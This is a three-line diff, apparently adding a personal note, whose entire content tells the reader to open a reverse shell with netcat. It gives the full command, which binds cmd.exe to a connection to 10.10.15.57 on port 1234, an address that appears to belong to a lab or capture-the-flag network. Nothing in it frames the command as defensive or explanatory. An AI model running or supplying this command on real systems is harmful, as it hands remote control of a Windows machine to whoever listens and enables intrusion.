@@ -1,0 +1,3 @@
+run the nc for reverse shell like this:
+
+nc.exe -e cmd.exe 10.10.15.57 1234
